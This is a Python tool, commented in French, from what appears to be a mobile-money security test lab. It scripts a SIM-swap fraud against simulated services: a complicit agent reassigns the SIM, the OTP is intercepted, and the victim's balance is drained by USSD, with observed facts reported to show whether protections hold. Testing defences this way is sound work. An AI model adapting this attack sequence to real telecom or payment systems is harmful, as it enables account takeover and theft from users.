"""Outil attaquant (EF-40) : exécute un cas d'abus de bout en bout contre le cœur, en une commande.

L'outil ne connaît RIEN du mode sans couche. Il exécute l'attaque, point — aucun drapeau « avec ou
sans protection », aucun test du monde dans lequel il opère. C'est le propriétaire qui bascule le
mode AVANT de lancer l'outil ; le même script, exécuté deux fois, produit deux résultats différents
sans qu'une seule ligne change. Donner à l'outil la moindre connaissance du mode détruirait la
preuve, qui tient à l'identité stricte des deux exécutions.

L'outil est un OBSERVATEUR, pas un juge : il publie chaque étape à mesure (ce que la console
affichera en T2-17), puis rapporte l'état CONSTATÉ — solde, sorties, notifications — des faits,
jamais un verdict.

Stdlib uniquement (argparse + urllib ; ADR-033), comme isc-hlr-agent. L'ossature permet d'ajouter
AC-03..AC-07 plus tard ; seul AC-02 est implémenté.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

_step = 0


def _publish(message: str) -> None:
    """Publie une étape de la chronologie (ce que la console affichera en T2-17, EF-41)."""
    global _step
    _step += 1
    print(f"[ETAPE {_step}] {message}", flush=True)


def _request(method: str, url: str, body: dict | None = None) -> tuple[int, dict]:
    data = json.dumps(body).encode("utf-8") if body is not None else None
    headers = {"Content-Type": "application/json"} if data is not None else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.load(resp)
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.load(exc)
        except (ValueError, OSError):
            return exc.code, {"error": exc.reason}
    except urllib.error.URLError as exc:
        return 0, {"error": f"coeur injoignable : {exc.reason}"}


def _get(core: str, path: str, **params: str) -> tuple[int, dict]:
    query = urllib.parse.urlencode(params)
    url = f"{core.rstrip('/')}{path}" + (f"?{query}" if query else "")
    return _request("GET", url)


def _post(core: str, path: str, body: dict) -> tuple[int, dict]:
    return _request("POST", f"{core.rstrip('/')}{path}", body)


class AttackAborted(Exception):
    """Une étape opérationnelle a échoué au niveau HTTP : l'attaque ne peut pas se dérouler."""


def _need(status: int, payload: dict, what: str) -> dict:
    """Exige une réponse 200 pour une étape opérationnelle ; sinon avorte (ce n'est pas un fait)."""
    if status != 200:
        raise AttackAborted(f"{what} : HTTP {status} {payload.get('error', '')}".strip())
    return payload


def _parse_ussd_result(message: str) -> tuple[str, str]:
    """Extrait (état, référence) du message final USSD : « Transfert EXECUTED. Reference <id> »."""
    state = "INCONNU"
    decision = ""
    if message.startswith("Transfert "):
        state = message[len("Transfert ") :].split(".", 1)[0].strip()
    if "Reference " in message:
        decision = message.split("Reference ", 1)[1].strip()
    return state, decision


def run_ac02(core: str, sim: str, args: argparse.Namespace) -> int:
    """AC-02 — vidage immédiat post-SIM swap (ISC-TM v1.2.1 §8). Observe et rapporte des faits.

    Deux interlocuteurs : le CŒUR (réattribution, émission/consommation OTP, canal USSD, lectures) et
    le RÉSEAU SMS simulé isc-sim (interception : lire la boîte de l'IMSI qu'on contrôle).
    """
    victim = args.victim

    # 1) Constat initial du solde.
    balance0 = _need(*_get(core, "/account", msisdn=victim), what="lecture du solde initial")
    balance0 = balance0["balanceXaf"]
    _publish(f"constat initial : victime {victim}, solde {balance0} FCFA")

    # 2) Réattribution de la SIM vers l'IMSI de l'attaquant (chemin de l'agent HLR complice).
    reassign = _need(
        *_post(
            core,
            "/hlr/reassign",
            {
                "msisdn": victim,
                "newImsi": args.attacker_imsi,
                "agentId": args.agent_id,
                "reason": args.motif,
            },
        ),
        what="reattribution SIM",
    )
    _publish(
        f"SIM reattribuee : {reassign['oldImsi']} -> {reassign['newImsi']} (agent {args.agent_id})"
    )

    # 3) OTP émis vers l'IMSI COURANT (désormais celui de l'attaquant).
    emission = _need(*_post(core, "/otp/issue", {"msisdn": victim}), what="emission OTP")
    target_imsi = emission["targetImsi"]
    _publish(f"OTP emis vers l'IMSI courant {target_imsi} (l'appareil attaquant)")

    # 4) Interception : l'attaquant lit le code sur la SIM qu'il contrôle — sur le RÉSEAU (isc-sim),
    #    jamais sur le cœur. Le cœur de production n'expose aucun moyen de relire un OTP livré.
    code = _need(*_get(sim, "/inbox", imsi=args.attacker_imsi), what="interception OTP (isc-sim)")
    code = code["code"]
    _publish(f"OTP intercepte sur l'appareil attaquant (via isc-sim) : {code}")

    # 5) Authentification par l'OTP intercepté (consommation, usage unique).
    verify = _need(
        *_post(core, "/otp/verify", {"msisdn": victim, "code": code}), what="verification OTP"
    )
    _publish(f"authentification par OTP intercepte : {verify['outcome']}")

    # 6) Vidage par le VRAI canal USSD (l'« authentification USSD » d'AC-02) : composer, saisir le
    #    montant, le bénéficiaire, confirmer. La machine à états mène au même transferP2P/operate. Une
    #    sortie refusée n'est PAS une erreur opérationnelle : c'est un fait à constater (mode protégé).
    dial = _need(*_post(core, "/ussd/dial", {"msisdn": victim}), what="USSD composition")
    session = dial["sessionId"]
    _need(
        *_post(core, "/ussd/input", {"sessionId": session, "text": str(balance0)}),
        what="USSD montant",
    )
    _need(
        *_post(core, "/ussd/input", {"sessionId": session, "text": args.beneficiary}),
        what="USSD beneficiaire",
    )
    final = _need(
        *_post(core, "/ussd/input", {"sessionId": session, "text": "1"}), what="USSD confirmation"
    )
    state, decision = _parse_ussd_result(final["message"])
    _publish(
        f"sortie USSD : {balance0} FCFA -> {args.beneficiary} (etat {state}, decision {decision})"
    )

    # 7) Constat final du solde.
    balance1 = _need(*_get(core, "/account", msisdn=victim), what="lecture du solde final")
    balance1 = balance1["balanceXaf"]
    _publish(f"constat final : victime {victim}, solde {balance1} FCFA")

    # 8) Notifications parvenues à l'ANCIEN appareil de la victime (son ancien IMSI).
    _, notifs = _get(core, "/notifications", msisdn=victim)
    rows = notifs if isinstance(notifs, list) else []
    old_device = sum(1 for n in rows if n.get("recipientRef") == args.victim_imsi)
    _publish(f"notifications sur l'ancien appareil ({args.victim_imsi}) : {old_device}")

    # --- État constaté : des faits, pas un jugement. En mode sans couche il constatera le compte
    #     vidé ; en mode protégé (mois 4) il constatera l'échec. Le rapport est le même : les faits.
    outputs = 1 if state in ("EXECUTED", "EXECUTED_DEGRADED") else 0
    print("--- ETAT CONSTATE (faits, pas jugement) ---")
    print(f"ORACLE_VICTIM={victim}")
    print(f"ORACLE_BALANCE_INITIAL={balance0}")
    print(f"ORACLE_BALANCE_FINAL={balance1}")
    print(f"ORACLE_OUTPUTS={outputs}")
    print(f"ORACLE_OUTPUT_BENEFICIARY={args.beneficiary}")
    print(f"ORACLE_OUTPUT_STATE={state}")
    print(f"ORACLE_OTP_TARGET_IMSI={target_imsi}")
    print(f"ORACLE_OLD_DEVICE_IMSI={args.victim_imsi}")
    print(f"ORACLE_OLD_DEVICE_NOTIFICATIONS={old_device}")
    return 0


# Ossature : ajouter AC-03..AC-07 ici plus tard. Seul AC-02 est implémenté au mois 2.
SCENARIOS = {"ac02": run_ac02}


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="isc-attacker",
        description="Outil attaquant : execute un cas d'abus de bout en bout contre le coeur (EF-40).",
    )
    sub = parser.add_subparsers(dest="scenario", required=True)
    ac02 = sub.add_parser("ac02", help="AC-02 : vidage immediat post-SIM swap (ISC-TM v1.2.1 §8)")
    ac02.add_argument("--victim", required=True, help="MSISDN de la victime")
    ac02.add_argument(
        "--victim-imsi", required=True, help="ancien IMSI de la victime (son appareil)"
    )
    ac02.add_argument("--attacker-imsi", required=True, help="IMSI de l'attaquant (nouvelle SIM)")
    ac02.add_argument("--beneficiary", required=True, help="beneficiaire controle par l'attaquant")
    ac02.add_argument("--agent-id", required=True, help="identifiant de l'agent HLR complice")
    ac02.add_argument("--motif", required=True, help="motif declare de la reattribution")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = _parser().parse_args(argv)
    core = os.environ.get("CORE_URL", "http://core:8080")
    sim = os.environ.get("SIM_URL", "http://sim:8080")
    try:
        return SCENARIOS[args.scenario](core, sim, args)
    except AttackAborted as exc:
        print(f"ATTACK_ABORTED : {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
